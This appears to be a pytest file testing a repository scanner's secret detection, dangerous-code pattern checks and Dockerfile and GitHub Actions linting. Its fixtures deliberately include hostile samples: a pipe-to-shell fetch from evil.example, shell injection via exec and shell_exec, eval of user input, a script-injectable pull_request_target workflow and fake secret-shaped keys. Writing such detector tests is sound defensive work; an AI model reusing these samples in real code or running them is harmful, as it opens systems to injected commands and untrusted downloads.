"""Tests for the deterministic detectors: secrets, language patterns, configs."""

from __future__ import annotations

import json

from gitport.detectors import (
    detect_language,
    lint_config,
    scan_source_patterns,
    scan_text_for_secrets,
)

# ---------------------------------------------------------------------------
# secrets
# ---------------------------------------------------------------------------

AWS_EXAMPLE = "AKIAIOSFODNN7EXAMPLE"  # canonical AWS docs example key
JWT_EXAMPLE = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
               ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ"
               ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
# assembled at runtime — secret-shaped literals in the repo trip push protection
STRIPE_EXAMPLE = "sk_live_" + "4eC39HqLyjWDarjtT1zdp7dc"
SLACK_EXAMPLE = "xoxb-" + "1234567890-abcdefghijkl"


def test_secrets_flags_real_shapes():
    text = (
        f'AWS_ACCESS_KEY_ID = "{AWS_EXAMPLE}"\n'
        f'session = "{JWT_EXAMPLE}"\n'
        'password: "hunter2hunter2"\n'
        f'api_key = "{STRIPE_EXAMPLE}"\n'
        f'slack = "{SLACK_EXAMPLE}"\n'
        "-----BEGIN RSA PRIVATE KEY-----\n"
    )
    res = scan_text_for_secrets(text, filename="app/config.py")
    assert res["ok"] is True
    assert res["scanned_lines"] == 6
    kinds = {f["kind"] for f in res["findings"]}
    assert {"aws-access-key", "jwt", "generic-secret", "stripe-live-key",
            "slack-token", "private-key"} <= kinds
    assert all(f["severity"] == "high" for f in res["findings"])


def test_secrets_never_leaks_full_match():
    text = f'AWS_ACCESS_KEY_ID = "{AWS_EXAMPLE}"\njwt = "{JWT_EXAMPLE}"\n'
    res = scan_text_for_secrets(text)
    blob = json.dumps(res)
    assert AWS_EXAMPLE not in blob
    assert JWT_EXAMPLE not in blob
    for f in res["findings"]:
        assert f["match_preview"].endswith("…")
        assert len(f["match_preview"]) == 7  # 6 chars + ellipsis


def test_secrets_flags_high_entropy_string():
    res = scan_text_for_secrets('session_key = "aB3kM9pQ2wX8zR5tY7uI0oP4sD6fG1hJ"\n')
    assert any(f["kind"] == "high-entropy-string" for f in res["findings"])


def test_secrets_clean_source():
    text = (
        'import os\n'
        'db_host = os.environ["DB_HOST"]\n'
        'homepage = "https://example.com/docs"\n'
        'git_sha = "9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1098"\n'
        'label = "thequickbrownfoxjumps"\n'
    )
    res = scan_text_for_secrets(text)
    assert res["ok"] is True
    assert res["findings"] == []


# ---------------------------------------------------------------------------
# language patterns
# ---------------------------------------------------------------------------

def test_detect_language():
    assert detect_language("web/app.ts") == "typescript"
    assert detect_language("web/app.tsx") == "typescript"
    assert detect_language("web/app.jsx") == "javascript"
    assert detect_language("cmd/server.go") == "go"
    assert detect_language("Main.java") == "java"
    assert detect_language("lib/tasks.rake") is None  # .rake not covered
    assert detect_language("index.php") == "php"
    assert detect_language("script.rb") == "ruby"
    assert detect_language("app/util.py") == "python"
    assert detect_language("README.md") is None


def test_scan_js_flags_dangerous_patterns():
    src = (
        "const { exec } = require('child_process');\n"
        "eval(userInput);\n"
        "exec('rm -rf ' + dir);\n"
        'console.log("debug", user);\n'
        'localStorage.setItem("auth_token", tok);\n'
        "el.innerHTML = html;\n"
    )
    res = scan_source_patterns(src, "web/app.js")
    assert res["ok"] is True
    assert res["language"] == "javascript"
    pats = {f["pattern"] for f in res["findings"]}
    assert {"eval", "shell-exec", "console-log", "localstorage-secret",
            "innerhtml", "child-process"} <= pats
    assert {f["pattern"]: f["severity"] for f in res["findings"]}["console-log"] == "low"


def test_scan_go_and_ruby_flag_exec():
    go = 'cmd := exec.Command("sh", "-c", fmt.Sprintf("rm %s", name))\n_ = unsafe.Pointer(p)\n'
    res = scan_source_patterns(go, "main.go")
    pats = {f["pattern"] for f in res["findings"]}
    assert {"exec-sprintf", "unsafe"} <= pats

    rb = "eval(params[:x])\nfiles = `ls #{dir}`\nbinding.pry\n"
    res = scan_source_patterns(rb, "lib/util.rb")
    pats = {f["pattern"] for f in res["findings"]}
    assert {"eval", "backticks", "binding-pry"} <= pats


def test_scan_java_and_php():
    java = ('Runtime.getRuntime().exec(cmd);\n'
            'ObjectInputStream ois = new ObjectInputStream(in);\n'
            'Cipher c = Cipher.getInstance("DES");\n')
    res = scan_source_patterns(java, "Main.java")
    pats = {f["pattern"] for f in res["findings"]}
    assert {"runtime-exec", "objectinputstream", "weak-cipher"} <= pats

    php = "$r = shell_exec($_GET['c']);\n$obj = unserialize($data);\n"
    res = scan_source_patterns(php, "index.php")
    pats = {f["pattern"] for f in res["findings"]}
    assert {"shell-exec", "unserialize"} <= pats


def test_scan_python_debugger_leftovers():
    res = scan_source_patterns("import pdb\npdb.set_trace()\nbreakpoint()\n", "app/util.py")
    pats = {f["pattern"] for f in res["findings"]}
    assert {"pdb", "breakpoint"} <= pats


def test_scan_source_clean():
    go = 'package main\n\nimport "fmt"\n\nfunc main() { fmt.Println("ok") }\n'
    res = scan_source_patterns(go, "main.go")
    assert res["findings"] == []
    js = "const x = pattern.exec(input);\nexport { x };\n"
    res = scan_source_patterns(js, "web/app.js")
    assert res["findings"] == []  # regex.exec is not a shell call


def test_scan_unknown_language_is_clean():
    res = scan_source_patterns("hello world\n", "notes.txt")
    assert res["ok"] is True
    assert res["language"] is None
    assert res["findings"] == []


# ---------------------------------------------------------------------------
# config lints
# ---------------------------------------------------------------------------

DOCKERFILE_BAD = """\
FROM ubuntu:latest
ADD https://evil.example/x.sh /tmp/x.sh
RUN curl -fsSL https://evil.example/install.sh | bash
ENV AWS_SECRET_KEY=abc123def456
CMD ["python3", "app.py"]
"""

DOCKERFILE_GOOD = """\
FROM python:3.12-slim
COPY app.py /app/app.py
RUN pip install -r requirements.txt
USER app
CMD ["python3", "/app/app.py"]
"""


def test_lint_dockerfile_flags_risks():
    res = lint_config(DOCKERFILE_BAD, "Dockerfile")
    assert res["ok"] is True
    assert res["kind"] == "dockerfile"
    rules = {f["rule"] for f in res["findings"]}
    assert {"unpinned-base-image", "remote-add", "pipe-to-shell",
            "env-secret", "missing-user"} <= rules
    assert res["hazardous"] is True


def test_lint_dockerfile_clean():
    res = lint_config(DOCKERFILE_GOOD, "deploy/Dockerfile")
    assert res["kind"] == "dockerfile"
    assert res["findings"] == []
    assert res["hazardous"] is False


WORKFLOW_BAD = """\
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: greet
        run: |
          echo "title: ${{ github.event.pull_request.title }}"
"""

WORKFLOW_GOOD = """\
on: pull_request
jobs:
  build:
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: echo hello
"""


def test_lint_workflow_flags_pwn_request_and_injection():
    res = lint_config(WORKFLOW_BAD, ".github/workflows/ci.yml")
    assert res["ok"] is True
    assert res["kind"] == "github-actions"
    rules = {f["rule"] for f in res["findings"]}
    assert {"pull-request-target-checkout", "script-injection",
            "unpinned-action"} <= rules
    assert res["hazardous"] is True


def test_lint_workflow_clean():
    res = lint_config(WORKFLOW_GOOD, ".github/workflows/ci.yml")
    assert res["kind"] == "github-actions"
    assert res["findings"] == []


def test_lint_config_unknown_kind():
    res = lint_config("key: value\n", "settings.yaml")
    assert res["ok"] is False
    assert res["kind"] is None
